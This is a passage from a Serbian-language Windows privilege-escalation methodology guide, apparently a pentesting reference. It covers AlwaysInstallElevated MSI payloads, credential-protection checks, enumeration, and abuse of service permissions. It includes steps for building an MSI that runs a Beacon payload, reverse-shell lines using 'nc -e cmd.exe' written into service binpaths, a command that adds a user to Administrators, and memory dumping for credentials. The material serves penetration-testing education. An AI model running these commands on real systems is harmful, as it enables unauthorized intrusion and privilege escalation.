- Otvorite **Visual Studio**, izaberite **Create a new project** i unesite „installer“ u polje za pretragu. Izaberite projekat **Setup Wizard** i kliknite na **Next**.
- Unesite naziv projekta, na primer **AlwaysPrivesc**, za lokaciju izaberite **`C:\privesc`**, izaberite **place solution and project in the same directory** i kliknite na **Create**.
- Klikajte na **Next** dok ne dođete do 3. koraka od 4 (izaberite datoteke koje želite da uključite). Kliknite na **Add** i izaberite Beacon payload koji ste upravo generisali. Zatim kliknite na **Finish**.
- Označite projekat **AlwaysPrivesc** u **Solution Explorer**-u i u odeljku **Properties** promenite **TargetPlatform** sa **x86** na **x64**.
  - Postoje i druga svojstva koja možete da promenite, kao što su **Author** i **Manufacturer**, zbog kojih instalirana aplikacija može da izgleda legitimnije.
- Kliknite desnim tasterom miša na projekat i izaberite **View > Custom Actions**.
- Kliknite desnim tasterom miša na **Install** i izaberite **Add Custom Action**.
- Dvaput kliknite na **Application Folder**, izaberite datoteku **beacon.exe** i kliknite na **OK**. Tako će se Beacon payload izvršiti čim se pokrene instalacioni program.
- U odeljku **Custom Action Properties** promenite **Run64Bit** u **True**.
- Na kraju, **izgradite projekat**.
  - Ako se prikaže upozorenje `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'`, proverite da li ste platformu postavili na x64.

### MSI instalacija

Da biste **instalaciju** zlonamerne `.msi` datoteke izvršili **u pozadini:**

```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```

Da biste iskoristili ovu ranjivost, možete koristiti: _exploit/windows/local/always_install_elevated_

## Antivirus i detektori

### Podešavanja nadzora

Ova podešavanja određuju šta se **beleži**, zato obratite pažnju

```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```

### WEF

Windows Event Forwarding, zanimljivo je znati gde se šalju logovi.

```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```

### LAPS

**LAPS** je osmišljen za **upravljanje lozinkama lokalnog Administrator naloga**, čime se obezbeđuje da svaka lozinka bude **jedinstvena, nasumična i redovno ažurirana** na računarima pridruženim domenu. Ove lozinke se bezbedno čuvaju u Active Directory-ju, a mogu da im pristupe samo korisnici kojima su dodeljene dovoljne dozvole putem ACL-ova, što im omogućava da vide lozinke lokalnog administratora ako su ovlašćeni.


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

Ako je aktivan, **lozinke u običnom tekstu čuvaju se u LSASS-u** (Local Security Authority Subsystem Service).\
[**Više informacija o WDigest-u na ovoj stranici**](../stealing-credentials/credentials-protections.md#wdigest).

```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```

### LSA zaštita

Počev od **Windows 8.1**, Microsoft je uveo unapređenu zaštitu za Local Security Authority (LSA) kako bi **blokirao** pokušaje nepouzdanih procesa da **čitaju njegovu memoriju** ili ubacuju kod, čime se sistem dodatno štiti.\
[**Više informacija o LSA zaštiti**](../stealing-credentials/credentials-protections.md#lsa-protection).

```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```

### Credential Guard

**Credential Guard** je uveden u **Windows 10**. Njegova svrha je da zaštiti akreditive sačuvane na uređaju od pretnji kao što su napadi pass-the-hash. [**Više informacija o Credential Guard-u dostupno je ovde.**](../stealing-credentials/credentials-protections.md#credential-guard)

```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```

### Keširani akreditivi

**Akreditive domena** autentifikuje **Local Security Authority** (LSA), a koriste ih komponente operativnog sistema. Kada registrovani bezbednosni paket autentifikuje podatke za prijavu korisnika, za tog korisnika se obično uspostavljaju akreditivi domena.\
[**Više informacija o keširanim akreditivima ovde**](../stealing-credentials/credentials-protections.md#cached-credentials).

```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```

## Korisnici i grupe

### Izlistavanje korisnika i grupa

Treba da proveriš da li neka od grupa kojima pripadaš ima zanimljive dozvole.

```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```

### Privilegovane grupe

Ako **pripadate nekoj privilegovanoj grupi, možda možete da eskalirate privilegije**. Ovde saznajte više o privilegovanim grupama i načinima na koje se mogu zloupotrebiti za eskalaciju privilegija:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Manipulacija tokenima

**Saznajte više** o tome šta je **token** na ovoj stranici: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Pogledajte sledeću stranicu da biste **saznali više o zanimljivim tokenima** i načinima na koje se mogu zloupotrebiti:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Prijavljeni korisnici / Sesije

```bash
qwinsta
klist sessions
```

### Korisničke fascikle

```bash
dir C:\Users
Get-ChildItem C:\Users
```

### Politika lozinki

```bash
net accounts
```

### Preuzmite sadržaj međuspremnika

```bash
powershell -command "Get-Clipboard"
```

## Pokrenuti procesi

### Dozvole za datoteke i fascikle

Pre svega, prilikom izlistavanja procesa **proverite da li se lozinke nalaze u komandnoj liniji procesa**.\
Proverite da li možete **da prepišete neku pokrenutu binarnu datoteku** ili imate dozvole za pisanje u fasciklu binarne datoteke kako biste iskoristili moguće [**DLL Hijacking attacks**](dll-hijacking/index.html):

```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```

Uvek proveravajte da li su pokrenuti [**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md) — mogli biste da ih zloupotrebite za eskalaciju privilegija.

Debugger listener može kratko da bude aktivan, pa to što ga nema u jednom pasivnom snimku portova ne dokazuje da nikada nije bio izložen. Povežite svaki uočeni listener sa njegovim PID-om, vlasnikom procesa i mogućnošću korisnika sa nižim privilegijama da mu pristupi; samo ime aplikacije ili debug zastavica ne dokazuju izvršavanje koda između korisnika. Rutinsko enumerisanje obavljajte pasivno, bez slanja debugger komandi.

**Provera dozvola nad binarnim datotekama procesa**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
	for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
		icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
	)
)
```

**Provera dozvola fascikli binarnih datoteka procesa (**[**DLL Hijacking**](dll-hijacking/index.html)**)**

```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
	icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```

### Direktorijumi za Snort dynamic preprocessor

Snort 2 može da učitava deljene biblioteke iz direktorijuma `dynamicpreprocessor directory` navedenog u konfiguraciji izabranoj pomoću `snort.exe -c <config>`. Ako zakazani zadatak ili servis pokreće Snort pod drugim nalogom, pregledajte upravo tu konfiguraciju i ACL deklarisanog direktorijuma modula. Ako vaš token može da kreira datoteke u tom direktorijumu, ta putanja je kandidat za proveru mogućeg izvršavanja koda prilikom sledećeg učitavanja modula koje obavi taj zadatak ili servis. Proverite efektivne privilegije naloga pod kojim se proces pokreće, aktivnu konfiguraciju, kompatibilnost modula i sva ograničenja deny ili share; samo mogućnost upisivanja u direktorijum ne dokazuje eskalaciju. [Snortova dokumentacija za dynamic preprocessor](https://www.snort.org/documents/dpx-readme) opisuje učitavanje modula tokom izvršavanja.

### Privilegovani web servis sa upisivim korenom dokumenata

Na Windows Apache instalaciji uporedite putanju izvršne datoteke servisa i nalog pod kojim se pokreće sa vrednošću `DocumentRoot` u aktivnoj datoteci `httpd.conf`. Za uobičajeni XAMPP raspored pregledajte `C:\xampp\apache\conf\httpd.conf` i ACL njegovog podešenog korena dokumenata, često `C:\xampp\htdocs`. Ako korisnik sa nižim privilegijama može da kreira datoteke u tom korenu dok Apache radi kao `LocalSystem`, izvršavanje serverskog koda može da pređe granicu privilegija računara. Potvrdite da je servis pokrenut, da se koristi tačna putanja i da serverski rukovalac obrađuje tip datoteke; mogućnost upisivanja u koren sama po sebi dokazuje samo kreiranje datoteka. Pregledajte ACL-ove bez upisivanja probne datoteke:

```powershell
Get-CimInstance Win32_Service -Filter "Name='Apache2.4'" | Select-Object Name, State, StartName, PathName
Select-String -Path 'C:\xampp\apache\conf\httpd.conf' -Pattern '^\s*DocumentRoot\s+'
icacls 'C:\xampp\htdocs'
```

Za konvencionalnu WAMP instalaciju, servis može pokazivati na verzionisani `C:\wamp64\bin\apache\apache*\bin\httpd.exe` (ili `C:\wamp\...` za 32-bitni raspored), a konfiguracija se nalazi pored njega, u `conf\httpd.conf`, uz podrazumevani korenski direktorijum `C:\wamp64\www` ili `C:\wamp\www`. Zajedno proverite tačnu putanju izvršne datoteke servisa, identitet pod kojim se izvršava, efektivni `DocumentRoot` (uključujući razrešavanje `${INSTALL_DIR}` i izmene za virtual hostove) i ACL korenskog direktorijuma. To što je WAMP direktorijum upisiv ne znači da se Apache izvršava kao `SYSTEM` niti da izvršava poslatu datoteku. [Apache dokumentuje kako Windows servis bira svoju konfiguraciju](https://httpd.apache.org/docs/2.4/platform/windows.html#winnt-service).

### Upisiv IIS korenski direktorijum i mrežni identitet application pool-a

Za IIS povežite fizički direktorijum koji je upisiv sa **aktivnim sajtom/aplikacijom** u `applicationHost.config`, a zatim utvrdite koji su pool i server-side handler za njega podešeni. Kod smešten u direktorijum koji se isporučuje izvršava se kao pool samo ako IIS obrađuje taj tip datoteke i ako je do te putanje moguće doći. Pre nego što upisiv direktorijum smatrate putem do izvršavanja koda, proverite efektivni pristup trenutnog korisnika za kreiranje datoteka, stanje sajta, handler i izmene koje važe za tu putanju.

Dinamička kompilacija ASP.NET-a otvara zasebnu putanju koju treba proveriti: generisane datoteke u direktorijumu za kompilaciju aplikacije. Podrazumevano je to direktorijum `Temporary ASP.NET Files` unutar relevantne instalacije .NET Framework-a, ali `<compilation tempDirectory>` aplikacije može da ga promeni. [Microsoft dokumentuje lokaciju i poddirektorijume po aplikaciji](https://learn.microsoft.com/en-us/previous-versions/aspnet/ms366723%28v%3Dvs.100%29) i [preporučuje izolovanje direktorijuma za kompilaciju kada application pool-ovi ne veruju jedni drugima](https://learn.microsoft.com/en-us/iis/manage/creating-websites/provisioning-iis-7-sites-for-shared-hosting#configuring-aspnet-temporary-compilation-directories). Ako token sa nižim privilegijama može da izmeni izvorni kod koji je generisan u kešu **konkretne** aplikacije, utvrdite da li ga ta aplikacija ponovo kompajlira pod privilegovanijim [identitetom worker procesa](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Sam ACL datoteke ili direktorijuma ne dokazuje izvršavanje koda: povežite keš sa aktivnom aplikacijom, efektivnim tokenom i ACL-om, podešavanjima kompilacije, identitetom procesa i vremenom ponovne kompilacije. Koristite pregled metapodataka samo za čitanje; nemojte pokretati kompilaciju niti menjati datoteke keša tokom enumeracije.

IIS pool podešen kao `ApplicationPoolIdentity` ili `NetworkService` obično se za pristup domenskim resursima autentifikuje kao **nalog računara hosta**, iako njegov lokalni token može imati niske privilegije. `LocalSystem` već ima visoke lokalne privilegije i na mreži takođe koristi nalog računara; `LocalService` obično koristi anonimne mrežne akreditive. Pool `SpecificUser` koristi nalog koji je za njega konfigurisan. [Microsoft dokumentuje ove tipove identiteta](https://learn.microsoft.com/en-us/iis/configuration/system.applicationhost/applicationpools/add/processmodel) i [mrežni identitet application pool-a](https://learn.microsoft.com/en-us/iis/manage/configuring-security/application-pool-identities). Ako podešavanje identiteta nije navedeno, mogu se naslediti podrazumevane vrednosti pool-a, koje se razlikuju među generacijama IIS-a, zato utvrdite efektivnu konfiguraciju umesto da nagađate na osnovu imena pool-a. Ako izvršavanje koda dosegne pool sa mrežnim identitetom računara, proverite prava **tog konkretnog računara** u direktorijumu. [DCSync](../active-directory-methodology/dcsync.md) zahteva prava replikacije na kontekstu imenovanja domena; sama mašinska karta ili uloga hosta ne dokazuju da ih računar ima. Pasivna enumeracija treba da pregleda konfiguraciju i ACL-ove, bez otpremanja datoteke, pokretanja mrežne autentifikacije ili zahtevanja karata.

Kod čitljivog ASP.NET handler-a koji pokreće pomoćni proces, pratite svaku vrednost izvedenu iz zahteva kroz autentifikaciju, dešifrovanje, validaciju i sastavljanje komande. Handler koji konkatenira dekodirani token u `ProcessStartInfo("cmd", "/c ...")` može omogućiti metaznakovima ljuske da izmene komandu; [Microsoft dokumentuje specijalne znakove komande `cmd`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/cmd). Utvrdite da li nepouzdani pozivalac zaista može da utiče na dekodiranu vrednost i dosegne handler, a zatim utvrdite efektivni identitet application pool-a ili identitet pod kojim se vrši impersonacija, kao i identitet child procesa. Čitljiva izvorna linija, localhost listener ili slabost formata tokena sami po sebi ne dokazuju izvršavanje privilegovanih komandi. Pregledajte izvorni kod i konfiguraciju pool-a, bez slanja falsifikovanih zahteva ili pokretanja pomoćnog procesa tokom pasivne enumeracije.

Kod PHP servisa na Windows-u, putanja kontrolisana zahtevom i prosleđena funkciji [`include` ili `require`](https://www.php.net/manual/en/function.include.php) može da izvrši PHP datoteku koju može da menja korisnik sa nižim privilegijama, pod identitetom worker procesa. Potvrdite da zahtev može da dođe do te naredbe, da razrešena putanja pokazuje na datoteku koju korisnik sa nižim privilegijama može da izmeni, a worker da pročita, da važeća PHP ograničenja putanje dozvoljavaju include i da se worker zaista izvršava sa višim privilegijama. Loopback listener ili upisiva datoteka sami po sebi ne dokazuju ovaj lanac; pregledajte izvorni kod, identitet servisa i ACL-ove datoteka, bez pozivanja endpoint-a tokom pasivne enumeracije.

### Pronalaženje lozinki u memoriji

Pomoћу **procdump** iz Sysinternals-a možete da napravite dump memorije pokrenutog procesa. Servisi kao što je FTP imaju **akreditive u čistom tekstu u memoriji**; pokušajte da napravite dump memorije i pročitate akreditive.

```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```

### Nezaštićene GUI aplikacije

**Aplikacije koje rade kao SYSTEM mogu korisniku omogućiti da pokrene CMD ili pregleda direktorijume.**

Primer: „Windows Help and Support“ (Windows + F1), pretražite „command prompt“, kliknite na „Click to open Command Prompt“

### Uvoz projektnih datoteka sa povišenim privilegijama

Aplikacija koja automatski otvara projekte iz padajućeg direktorijuma u koji korisnik sa nižim privilegijama može da upisuje prelazi granicu poverenja u ulaznim podacima pod nalogom uvoznika. Proverite **tačnu putanju u koju se može upisivati**, proces ili zadatak koji je otvara, njegov efektivni identitet i verziju parsera. [Istorijski problem pri otvaranju/obnavljanju Ghidra projekta](https://github.com/NationalSecurityAgency/ghidra/issues/71) omogućavao je XML external entities u metapodacima projekta; mrežni entitet na Windowsu mogao je da izazove autentifikaciju naloga koji uvozi projekat, ako to dozvoljavaju [politika odlaznog SMB-a i NTLM-a](https://learn.microsoft.com/en-us/windows-server/storage/file-server/smb-ntlm-blocking). To je nagoveštaj mogućeg izlaganja akreditiva, a ne neposrednog pristupa administratora: odgovor mora moći da se iskoristi zasebnom, ovlašćenom ili ranjivom putanjom, a aktuelne verzije treba proceniti na osnovu stvarnog statusa zakrpa. Tokom pasivnog popisivanja nemojte otvarati posebno kreiran projekat; pregledajte tok uvoza i ACL-ove.

## Services

Pravo [`SC_MANAGER_CREATE_SERVICE`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) nad objektom Service Control Manager (SCM) odvojeno je od prava nad postojećom uslugom. Uspešan, samo za čitanje, [`OpenSCManager` zahtev za pristup](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-openscmanagerw) za to pravo jeste povod za proveru, a ne dokaz da se nova usluga može pokrenuti. [`CreateService` vraća handle](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicew) sa pravima pristupa usluzi zatraženim prilikom njenog kreiranja; kasnije ponovno otvaranje usluge predstavlja zasebnu proveru pristupa i može da ne uspe čak i kada bi se originalni handle mogao koristiti. Zasebno proverite efektivni lokalni ili udaljeni token, dodeljena prava handle-a, nalog usluge, politiku pokretanja i putanju do izvršne datoteke. Tokom pasivnog popisivanja nemojte kreirati niti pokretati uslugu.

Za udaljenu putanju instalacije usluge, uporedite ta prava SCM-a sa deljenim direktorijumom na ciljnom sistemu u koji **ista mrežna prijava** može da upisuje, njegovim osnovnim NTFS ACL-om i lokalnom putanjom do izvršne datoteke koju nalog usluge može da pokrene. Nalog koji nije administratorski može da pređe ovu granicu ako postoje neuobičajeno široka SCM prava i putanja za smeštanje datoteke; administrativni deljeni direktorijum nije nužan uslov. Samo pravo upisa u deljeni direktorijum ili samo nagoveštaj prava za kreiranje usluge u SCM-u ne dokazuje da nova usluga može da se pokrene sa višim identitetom.

Postojeća usluga može da pozove pomoćnu izvršnu datoteku pri pokretanju, gašenju ili drugom događaju životnog ciklusa, čak i kada se ta datoteka ne nalazi u njenom `ImagePath`. Ako se ime pomoćne datoteke razrešava u direktorijum u koji korisnik са nižim privilegijama može da upisuje, a usluga radi sa višim identitetom, nedostajuća pomoćna datoteka može biti uslovni kandidat za zamenu. Potvrdite **stvarni kod usluge ili dokumentovano pozivanje pomoćne datoteke**, razrešenu putanju do izvršne datoteke i redosled pretrage, prava za kreiranje direktorijuma, identitet usluge i dostupan okidač životnog ciklusa. Direktorijum usluge u koji može da se upisuje ili sama nedostajuća datoteka ne dokazuju da će usluga učitati tu datoteku; tokom pasivne provere nemojte pokretati niti zaustavljati uslugu.

Za postojeću uslugu, [`SERVICE_START` dozvoljava prosleđivanje argumenata funkciji `StartService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-startservicew); to se razlikuje od [`SERVICE_CHANGE_CONFIG`](https://learn.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights). Pre nego što pristup za pokretanje smatrate nečim više od prava upravljanja, pregledajte kod usluge ili njen dokumentovani interfejs. Ako koristi argument koji bira pozivalac kao putanju za log ili izvoz, proverite identitet usluge, tačan tok od argumenta do upisa, ograničenja putanje i dozvole nad **kreiranom datotekom**. Upis u zaštićeni direktorijum može da dovede do eskalacije само ako postoji zaseban privilegovani potrošač ili učitavač koji prihvata tu datoteku; sam upis u log ili pravo pokretanja nisu dovoljni. Pasivno popisivanje ne treba da pokreće uslugu niti da kreira probnu datoteku.

Kod NSClient++ agenta za nadzor, čitljiv `nsclient.ini` predstavlja **povod za proveru konfiguracije**: može da sadrži veb akreditive, dok `boot.ini` može da preusmeri konfiguraciju na drugu lokaciju. Proverite stvarni nalog usluge, WEB listener i politiku pristupa, kao i da li autentifikovana uloga može da menja podešavanja ili skripte. Za izvršavanje sa privilegijama dodatno su potrebni `CheckExternalScripts` (ili druga omogućena putanja za izvršavanje), efektivno pravo za registrovanje ili izmenu komande i okidač koji je pokreće pod identitetom usluge. Listener dostupan samo preko loopback-a i dalje može biti dostupan lokalnom korisniku, ali sama putanja do datoteke, lozinka ili listener ne dokazuju postojanje tih prava. Tokom pasivnog popisivanja pregledajte metapodatke i dozvole bez prikazivanja tajni ili pozivanja veb API-ja. Pogledajte [raspored datoteka u NSClient++](https://nsclient.org/docs/concepts/file-layout/), [bezbednosne smernice za veb i skripte](https://nsclient.org/docs/setup/securing/) i [konfiguraciju eksternih skripti](https://nsclient.org/docs/reference/check/CheckExternalScripts/).

Za uslugu čiji je `ImagePath` `nssm.exe`, proverite stvarni nalog pod kojim se usluga pokreće i njenu vrednost `HKLM\SYSTEM\CurrentControlSet\Services\<name>\Parameters\Application`: [NSSM tamo čuva podređenu aplikaciju](https://git.nssm.cc/nssm/nssm/src/96e7f4484a3dc962482c240909fd52b0e0226a60/registry.h), dok je `AppDirectory` njen podešeni radni direktorijum. Proverite podređenu izvršnu datoteku i ACL-ove njenih nadređenih direktorijuma pre nego što prava omotača smatrate celom granicom usluge. Lokalna WCF ili SOAP krajnja tačka koju izlaže ta podređena aplikacija predstavlja zaseban povod za proveru: potvrdite da li niže privilegovani korisnik može da dođe do listener-a, da li tačna operacija prihvata njegov ulaz i da li podređena aplikacija usluge izvršava nebezbednu operaciju pod višim identitetom. Nalog usluge, URL krajnje tačke ili putanja u koju može da se upisuje sami po sebi ne dokazuju eskalaciju; izbegavajte pozivanje operacija usluge tokom pasivnog popisivanja.

Za prilagođenu WCF operaciju, pratite string pod kontrolom pozivaoca do bilo kog PowerShell runspace-a. [`Pipeline.Commands.AddScript` dodaje tekst skripte](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.commandcollection.addscript), a [`Pipeline.Invoke` pokreće pipeline](https://learn.microsoft.com/en-us/dotnet/api/system.management.automation.runspaces.pipeline.invoke). [`netTcpBinding` sa Windows transportnim akreditivima](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/wcf/transport-of-nettcpbinding) autentifikuje klijenta, ali ovlašćenje za pozivanje te **konkretne** operacije i efektivni identitet runspace-a treba proveriti zasebno. Putanja od ulaza pozivaoca sa nižim privilegijama do `AddScript`-a pod višim identitetom usluge predstavlja granicu za izvršavanje koda; port koji osluškuje, autentifikovani klijent ili nekorišćena metoda u nepovezanom sklopu sami po sebi nisu dokaz. Statički pregledajte instaliranu uslugu, ugovor, ovlašćenja i podešavanja impersonation-a, bez pozivanja krajnje tačke tokom popisivanja.

Service Triggers omogućavaju Windowsu da pokrene uslugu kada nastupe određeni uslovi (aktivnost imenovane cevi/RPC krajnje tačke, ETW događaji, dostupnost IP-a, priključenje uređaja, osvežavanje GPO-a itd.). Čak i bez prava SERVICE_START, često možete da pokrenete privilegovane usluge aktiviranjem njihovih okidača. Tehnike za popisivanje i aktiviranje pogledajte ovde:

-
{{#ref}}
service-triggers.md
{{#endref}}

### Usluga za prikupljanje dijagnostike u Visual Studio-u

Visual Studio instalacije sa C/C++ alatima mogu da sadrže `VSStandardCollectorService150`, dijagnostičku uslugu podešenu da radi kao `LocalSystem`. [CVE-2024-20656](https://www.mdsec.co.uk/2024/01/cve-2024-20656-local-privilege-escalation-in-vsstandardcollectorservice150-service/) koristio je junction i trku uslova sa object-manager-link-om da preusmeri resetovanje DACL-a usluge. Za prikazanu eskalaciju bila je potrebna i upotrebljiva putanja za popravku MSI-ja pomoću Visual Studio Setup WMI Provider-a, kao i njena ciljna datoteka `C:\ProgramData\Microsoft\VisualStudio\SetupWMI\MofCompiler.exe`. Komponenta je ispravljena u januaru 2024.

Za pasivnu trijažu pregledajte nalog i putanju do binarne datoteke te jedne usluge, proverite da li postoji putanja do Setup WMI compiler-a i utvrdite status zakrpa instalirane komponente. Stavka usluge, verzija Visual Studio proizvoda ili datoteka compiler-a sami po sebi ne dokazuju da je host ranjiv. Provera ne zahteva pokretanje usluge niti izvršavanje popravke.

Pribavite listu usluga:

```bash
net start
wmic service list brief
sc query
Get-Service
```

### Dozvole

Možete koristiti **sc** da biste dobili informacije o servisu.

```bash
sc qc <service_name>
```

Preporučuje se da imate binarnu datoteku **accesschk** iz paketa _Sysinternals_ kako biste proverili potreban nivo privilegija za svaku uslugu.

```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```

Preporučuje se da proverite da li „Authenticated Users“ mogu da menjaju neki servis:

```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```

[Ovde možete da preuzmete accesschk.exe za XP](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Omogućavanje servisa

Ako dobijate ovu grešku (na primer, sa SSDPSRV):

_Došlo je do sistemske greške 1058._\
_Usled onemogućavanja servisa ili zato što uz njega nisu povezani omogućeni uređaji, servis ne može da se pokrene._

Možete da ga omogućite pomoću

```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```

**Imajte u vidu da servis upnphost zavisi od SSDPSRV-a da bi radio (za XP SP1)**

**Još jedno zaobilazno rešenje** ovog problema je pokretanje:

```
sc.exe config usosvc start= auto
```

### **Izmena putanje binarne datoteke servisa**

U scenariju u kojem grupa „Authenticated users“ ima **SERVICE_ALL_ACCESS** dozvole za servis, moguće je izmeniti izvršnu binarnu datoteku servisa. Da biste izmenili i izvršili **sc**:

```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```

### Ponovno pokretanje usluge

```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```

Privilegije se mogu eskalirati putem različitih dozvola:

- **SERVICE_CHANGE_CONFIG**: Omogućava rekonfigurisanje binarne datoteke servisa.
- **WRITE_DAC**: Omogućava rekonfigurisanje dozvola, što omogućava menjanje konfiguracije servisa.
- **WRITE_OWNER**: Omogućava preuzimanje vlasništva i rekonfigurisanje dozvola.
- **GENERIC_WRITE**: Nasleđuje mogućnost menjanja konfiguracije servisa.
- **GENERIC_ALL**: Takođe nasleđuje mogućnost menjanja konfiguracije servisa.

Za otkrivanje i iskorišćavanje ove ranjivosti može se koristiti _exploit/windows/local/service_permissions_.

### Slabe dozvole za binarne datoteke servisa

Ako se servis pokreće kao **`LocalSystem`**, **`LocalService`**, **`NetworkService`** ili kao privilegovani domenски nalog, ali **korisnici sa niskim privilegijama mogu da menjaju EXE datoteku servisa ili njen nadređeni folder**, servis se često može preoteti **zamenom binarne datoteke i ponovnim pokretanjem servisa**.

**Proverite da li možete da menjate binarnu datoteku koju pokreće servis** ili imate **dozvole za pisanje u folderu** u kom se binarna datoteka nalazi ([**DLL Hijacking**](dll-hijacking/index.html)**.**\
Možete da pronađete sve binarne datoteke koje pokreće servis pomoću **wmic** (ne u system32) i da proverite svoje dozvole pomoću **icacls**:

```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```

Možete koristiti i **sc** i **icacls**:

```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```

Potražite opasne ACL-ove dodeljene grupama **`Everyone`**, **`BUILTIN\Users`** ili **`Authenticated Users`**, naročito dozvole **`(F)`**, **`(M)`** ili **`(W)`** nad izvršnom datotekom servisa ili direktorijumom koji je sadrži. Praktičan tok zloupotrebe je:<sup>[[27]](#references)</sup>

1. Proverite nalog servisa i putanju do izvršne datoteke pomoću `sc qc <service_name>`.
2. Proverite da li je binarna datoteka upisiva pomoću `icacls <path>`.
3. Zamenite binarnu datoteku servisa payload-om ili ispravnom zlonamernom binarnom datotekom servisa.
4. Ponovo pokrenite servis pomoću `sc stop <service_name> && sc start <service_name>` (ili sačekajte ponovno pokretanje sistema / aktiviranje okidača servisa).

Korisne automatizovane provere:<sup>[[28]](#references)</sup>

```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```

> Ako servis ne dozvoljava običnom korisniku da ga ponovo pokrene, proverite da li se automatski pokreće pri podizanju sistema, da li ima podešenu akciju za slučaj greške koja ga ponovo pokreće ili može indirektno da ga pokrene aplikacija koja ga koristi.

### Dozvole za izmenu registra servisa

Trebalo bi da proverite da li možete da menjate neki registar servisa.\
Možete **proveriti** svoje **dozvole** nad **registrom** servisa pomoću:

```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```

Originalni test dozvola bio je naveden ovako:

Treba proveriti da li **Authenticated Users** ili **NT AUTHORITY\INTERACTIVE** imaju dozvole `FullControl`. Ako ih imaju, može se izmeniti binarna datoteka koju servis izvršava.

